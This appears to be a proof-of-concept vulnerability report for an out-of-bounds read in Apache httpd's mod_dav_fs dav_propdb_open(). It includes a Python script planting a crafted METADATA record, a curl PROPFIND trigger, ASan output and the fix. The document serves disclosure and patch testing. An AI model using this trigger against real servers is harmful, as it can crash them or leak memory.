# PoC 113 — Namespace Count Overreads Metadata Buffer

`dav_propdb_open()` trusts the on-disk `ns_count` and walks the namespace
table with `strlen()`, never proving each entry is NUL-terminated inside the
copied DBM value. A crafted `METADATA` record drives an out-of-bounds read.

## Setup

Same `mod_dav` / `mod_dav_fs` configuration as PoC 112. Run httpd under
AddressSanitizer.

```apache
ServerName 127.0.0.1
Listen 8080
LoadModule mpm_prefork_module    modules/mod_mpm_prefork.so
LoadModule dav_module            modules/mod_dav.so
LoadModule dav_fs_module         modules/mod_dav_fs.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule unixd_module          modules/mod_unixd.so

DAVLockDB /tmp/davlock
DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    DAV On
    Require all granted
</Directory>
```

```bash
mkdir -p /tmp/htdocs/.DAV
touch /tmp/htdocs/file.txt
```

## Trigger

Plant a `METADATA` record of `sizeof(dav_propdb_metadata)` bytes (so the
size check from PoC 112 alone would not save us) but containing a
non-zero `ns_count` and *no NUL byte after the header*. The namespace walk
then runs `strlen()` past the copied buffer.

`/tmp/plant_unbounded_ns.py`:

```python
import dbm.ndbm, struct, socket

# struct dav_propdb_metadata { apr_uint16_t major; apr_uint16_t minor;
#                              apr_uint16_t ns_count; ... };
# We write the prefix big-endian (network) per the source's ntohs().
DAV_DBVSN_MAJOR = 4   # current value as of 2.4.x; matches m.major check
hdr = struct.pack(">HHH", DAV_DBVSN_MAJOR, 0, 1)   # major, minor, ns_count=1

# Pad to exactly sizeof(dav_propdb_metadata). On Linux/x86_64 the struct
# rounds to 8 bytes; we send 12 to also cover ARM/Win32 alignments.
hdr = hdr.ljust(12, b"\x00")

# After the header: a "namespace" with NO NUL terminator.
trailer = b"http://example.invalid/no-nul-here-and-no-nul-after-this-either"
value = hdr + trailer
print("len =", len(value), " ns_count = 1, no NUL after header")

db = dbm.ndbm.open("/tmp/htdocs/.DAV/file.txt", "n")
db[b"METADATA"] = value
db.close()
```

```bash
python3 /tmp/plant_unbounded_ns.py
```

Trigger property DB open via `PROPFIND`:

```bash
curl -sv -X PROPFIND -H 'Depth: 0' \
     --data-binary '<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>' \
     -H 'Content-Type: application/xml' \
     http://127.0.0.1:8080/file.txt
```

## Observed effect

```text
==1234==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
READ of size 1
    #0 ... in __interceptor_strlen
    #1 dav_propdb_open  modules/dav/fs/dbm.c:498
    #2 dav_really_open_db modules/dav/main/props.c:512
```

The overrun occurs while iterating namespace strings: `strlen(uri)` walks
past `db->ns_table.buf + db->ns_table.cur_len`.

With the patch (`end = ns_table.buf + cur_len; if (uri >= end ||
memchr(uri, '\\0', end - uri) == NULL) reject`), the malformed metadata is
rejected and `PROPFIND` returns a clean 500.

## Marker

ASan `heap-buffer-overflow ... READ of size 1 ... __interceptor_strlen
... dav_propdb_open (modules/dav/fs/dbm.c:498)`.
